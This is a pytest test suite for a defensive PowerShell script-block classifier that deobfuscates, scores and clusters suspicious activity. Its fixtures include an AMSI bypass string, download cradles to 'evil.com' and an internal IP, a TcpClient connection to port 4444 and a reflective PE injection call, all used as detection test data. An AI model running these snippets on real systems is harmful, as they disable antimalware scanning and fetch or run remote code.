"""
ps_classifier — test suite

Run: python -m pytest tests/test_core.py -v
"""

import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest
from datetime import datetime, timezone, timedelta

from core.models       import ScriptBlock, Finding, Session, shannon_entropy, TempoClass
from core.deobfuscator import deobfuscate
from core.classifier   import Classifier
from core.ingest       import (reassemble_multipart, stitch_sessions,
                                score_block, score_session, enrich_session,
                                classify_tempo, extract_iocs)
from core.fingerprinter import extract_fingerprint, cluster_into_campaigns
from core.baseline     import EnvironmentBaseline


# ── Fixtures ──────────────────────────────────────────────────────────────────

def make_block(text: str, host="host-01", pid=1234, tid=1, seconds_offset=0,
               block_id=None, block_num=1, block_total=1) -> ScriptBlock:
    import uuid
    from core.models import shannon_entropy
    from core.deobfuscator import deobfuscate
    result = deobfuscate(text)
    return ScriptBlock(
        block_id=block_id or str(uuid.uuid4()),
        host_id=host,
        process_id=pid,
        thread_id=tid,
        timestamp=datetime(2024, 6, 1, 12, 0, seconds_offset, tzinfo=timezone.utc),
        path="",
        raw_text=text,
        decoded_text=result.decoded,
        block_number=block_num,
        block_total=block_total,
        entropy=shannon_entropy(text),
    )


# ── Entropy ───────────────────────────────────────────────────────────────────

def test_entropy_empty():
    assert shannon_entropy("") == 0.0

def test_entropy_uniform():
    assert shannon_entropy("aaaa") == 0.0

def test_entropy_high():
    # Random-looking base64 should have entropy > 5
    e = shannon_entropy("aB3xKj9mRnTqLpVwYzFsEuHcDiOgN2+/==")
    assert e > 4.5

def test_entropy_low():
    # Plain English PS is low-entropy
    e = shannon_entropy("Write-Host 'Hello World'")
    assert e < 4.0


# ── Deobfuscator ─────────────────────────────────────────────────────────────

def test_deobfuscate_backtick():
    r = deobfuscate("pow`ersh`ell")
    assert "powershell" in r.decoded.lower()
    assert "backtick" in r.transforms_applied

def test_deobfuscate_char_concat():
    # [char]73+[char]69+[char]88 = I+E+X (chars decoded, concat preserved for PS to eval)
    r = deobfuscate("[char]73+[char]69+[char]88")
    assert "I" in r.decoded and "E" in r.decoded and "X" in r.decoded
    assert "char" not in r.decoded.lower()

def test_deobfuscate_join():
    r = deobfuscate("('I','E','X') -join ''")
    assert "IEX" in r.decoded

def test_deobfuscate_format_string():
    r = deobfuscate('"{0}{2}{1}" -f "po","hell","wers"')
    assert "powers" in r.decoded.lower()

def test_deobfuscate_stable_on_clean():
    clean = "Write-Host 'no obfuscation here'"
    r = deobfuscate(clean)
    assert r.decoded == clean
    assert r.passes_run == 1

def test_deobfuscate_no_infinite_loop():
    # Deeply nested should not loop forever
    r = deobfuscate("[char]65" * 100)
    assert r.passes_run <= 12


# ── Classifier ────────────────────────────────────────────────────────────────

def test_classifier_amsi_bypass():
    clf = Classifier()
    block = make_block("$x = [Ref].Assembly.GetType('System.Management.Automation.amsiInitFailed')")
    clf.classify(block)
    techs = {f.technique_id for f in block.findings}
    assert "AMSI_BYPASS_REFLECT" in techs

def test_classifier_download_cradle():
    clf = Classifier()
    block = make_block("(New-Object Net.WebClient).DownloadString('http://evil.com/payload')")
    clf.classify(block)
    techs = {f.technique_id for f in block.findings}
    assert "DOWNLOAD_CRADLE_WC" in techs

def test_classifier_clean_block():
    clf = Classifier()
    block = make_block("Get-Process | Where-Object { $_.CPU -gt 10 }")
    clf.classify(block)
    # May have no findings, or only low-severity ones
    assert all(f.severity < 60 for f in block.findings)

def test_classifier_multiple_techniques():
    clf = Classifier()
    block = make_block(
        "amsiInitFailed; (New-Object Net.WebClient).DownloadString('http://evil.com')"
    )
    clf.classify(block)
    techs = {f.technique_id for f in block.findings}
    assert len(techs) >= 2

def test_classifier_entropy_heuristic():
    """Very high entropy block with no rule match should get entropy-only finding."""
    clf = Classifier()
    # Construct a string with high entropy but no rule triggers
    import random, string
    high_entropy = ''.join(random.choices(string.printable, k=600))
    block = make_block(high_entropy)
    block.entropy = 6.5   # force high entropy
    clf.classify(block)
    techs = {f.technique_id for f in block.findings}
    assert "HIGH_ENTROPY_BLOB" in techs


# ── Session stitcher ──────────────────────────────────────────────────────────

def test_stitch_same_host_pid():
    blocks = [
        make_block("cmd1", seconds_offset=0),
        make_block("cmd2", seconds_offset=10),
        make_block("cmd3", seconds_offset=20),
    ]
    sessions = stitch_sessions(blocks)
    assert len(sessions) == 1
    assert len(sessions[0].blocks) == 3

def test_stitch_gap_boundary():
    base = datetime(2024, 6, 1, 12, 0, 0, tzinfo=timezone.utc)
    b1 = make_block("cmd1"); b1.timestamp = base
    b2 = make_block("cmd2"); b2.timestamp = base + timedelta(seconds=200)
    sessions = stitch_sessions([b1, b2], gap_seconds=120)
    assert len(sessions) == 2

def test_stitch_different_hosts():
    blocks = [
        make_block("cmd1", host="host-01"),
        make_block("cmd2", host="host-02"),
    ]
    sessions = stitch_sessions(blocks)
    assert len(sessions) == 2

def test_stitch_different_pids():
    blocks = [
        make_block("cmd1", host="host-01", pid=100),
        make_block("cmd2", host="host-01", pid=999),
    ]
    sessions = stitch_sessions(blocks)
    assert len(sessions) == 2


# ── Multi-part reassembly ──────────────────────────────────────────────────────

def test_reassemble_multipart():
    bid = "test-guid-1234"
    p1 = make_block("part1_", block_id=bid, block_num=1, block_total=2)
    p2 = make_block("part2_", block_id=bid, block_num=2, block_total=2)
    result = reassemble_multipart([p1, p2])
    assert len(result) == 1
    assert "part1_" in result[0].raw_text
    assert "part2_" in result[0].raw_text

def test_reassemble_single_block_passthrough():
    b = make_block("single block")
    result = reassemble_multipart([b])
    assert len(result) == 1


# ── Tempo classification ──────────────────────────────────────────────────────

def test_tempo_single_block():
    session = Session(session_id="s1", host_id="h1", process_id=1,
                      blocks=[make_block("x")])
    assert classify_tempo(session) == TempoClass.SINGLE_BLOCK

def test_tempo_automated():
    # Blocks arriving 0.05s apart, very consistent
    blocks = []
    for i in range(6):
        b = make_block(f"cmd{i}")
        b.timestamp = datetime(2024, 1, 1, 12, 0, 0, i * 50000, tzinfo=timezone.utc)
        blocks.append(b)
    session = Session(session_id="s2", host_id="h1", process_id=1, blocks=blocks)
    assert classify_tempo(session) == TempoClass.AUTOMATED_STAGER

def test_tempo_interactive():
    # Human-scale gaps with high variance: mean=68s cv=0.84 → INTERACTIVE_OPERATOR
    base = datetime(2024, 1, 1, 12, 0, 0, tzinfo=timezone.utc)
    offsets = [0, 8, 35, 120, 185, 340]
    blocks = []
    for i, off in enumerate(offsets):
        b = make_block(f"cmd{i}")
        b.timestamp = base + timedelta(seconds=off)
        blocks.append(b)
    session = Session(session_id="s3", host_id="h1", process_id=1, blocks=blocks)
    assert classify_tempo(session) == TempoClass.INTERACTIVE_OPERATOR


# ── Scorer ────────────────────────────────────────────────────────────────────

def test_score_block_no_findings():
    block = make_block("Get-Process")
    block.findings = []
    block.entropy = 2.0
    assert score_block(block) == 0

def test_score_block_critical():
    block = make_block("")
    block.findings = [Finding("AMSI_BYPASS_REFLECT","T1562.001",90,"test","x","x")]
    block.entropy = 3.0
    s = score_block(block)
    assert s >= 90

def test_score_block_combo_bonus():
    block = make_block("")
    block.findings = [
        Finding("AMSI_BYPASS_REFLECT","T1562.001",90,"r1","x","x"),
        Finding("DOWNLOAD_CRADLE_WC","T1105",75,"r2","y","y"),
    ]
    block.entropy = 3.0
    s = score_block(block)
    assert s > 90  # combo bonus applied

def test_score_session_chain_bonus():
    clf = Classifier()
    # Build session with AMSI bypass + download cradle — should get chain bonus
    b1 = make_block("amsiInitFailed", seconds_offset=0)
    b2 = make_block("(New-Object Net.WebClient).DownloadString('http://evil.com')", seconds_offset=5)
    clf.classify(b1)
    clf.classify(b2)
    b1.severity = score_block(b1)
    b2.severity = score_block(b2)
    session = Session(
        session_id="test", host_id="h1", process_id=1,
        blocks=[b1, b2],
        technique_set={f.technique_id for b in [b1, b2] for f in b.findings},
        start_time=b1.timestamp, end_time=b2.timestamp
    )
    session.tempo = TempoClass.INTERACTIVE_OPERATOR
    s = score_session(session)
    assert s >= 70   # chain bonus + techniques should push well past 70


# ── IOC extraction ────────────────────────────────────────────────────────────

def test_extract_iocs_url():
    iocs = extract_iocs("(New-Object Net.WebClient).DownloadString('http://192.168.1.100/payload.ps1')")
    assert any("http://" in i for i in iocs)

def test_extract_iocs_ip():
    iocs = extract_iocs("$c = New-Object Net.Sockets.TcpClient('10.0.0.5', 4444)")
    assert any("10.0.0.5" in i for i in iocs)


# ── Baseline ──────────────────────────────────────────────────────────────────

def test_baseline_known_good_suppression():
    bl = EnvironmentBaseline()
    # Ingest enough observations to activate baseline
    for _ in range(150):
        bl.ingest_benign(make_block("Get-Process | Where-Object CPU -gt 10"))
    block = make_block("Get-Process | Where-Object CPU -gt 10")
    # Exact match should score 0
    assert bl.anomaly_score(block) == 0.0

def test_baseline_novel_high_score():
    bl = EnvironmentBaseline()
    for _ in range(150):
        bl.ingest_benign(make_block("Write-Host hello"))
    novel = make_block("Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId 1234")
    score = bl.anomaly_score(novel)
    assert score > 30   # novel cmdlets → high anomaly

def test_baseline_save_load(tmp_path):
    bl = EnvironmentBaseline()
    for _ in range(10):
        bl.ingest_benign(make_block("Get-Process"))
    path = tmp_path / "baseline.json"
    bl.save(path)
    bl2 = EnvironmentBaseline.load(path)
    assert bl2.observation_count == 10
    assert "get-process" in bl2.cmdlet_frequency


# ── Campaign correlation ──────────────────────────────────────────────────────

def test_campaign_clustering():
    """Sessions with identical obfuscation style across 2+ hosts should cluster."""
    # Same obfuscation style — will produce same fingerprint
    shared_obfuscation = "po`w`ersh`ell -enc ABCDEFGH==; [char]73+[char]69+[char]88"

    def make_session(host, pid):
        b = make_block(shared_obfuscation, host=host, pid=pid)
        b.findings = [Finding("AMSI_BYPASS_REFLECT","T1562.001",90,"r","x","x")]
        b.severity = 90
        s = Session(
            session_id=f"{host}_{pid}", host_id=host, process_id=pid,
            blocks=[b], weighted_score=90.0, max_severity=90,
            technique_set={"AMSI_BYPASS_REFLECT"},
            start_time=b.timestamp, end_time=b.timestamp,
        )
        return s

    sessions = [
        make_session("host-01", 100),
        make_session("host-02", 200),
        make_session("host-03", 300),
    ]
    campaigns = cluster_into_campaigns(sessions, min_hosts=2, min_sessions=2)
    assert len(campaigns) >= 1
    assert campaigns[0].is_confirmed or len(campaigns[0].sessions) >= 2


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
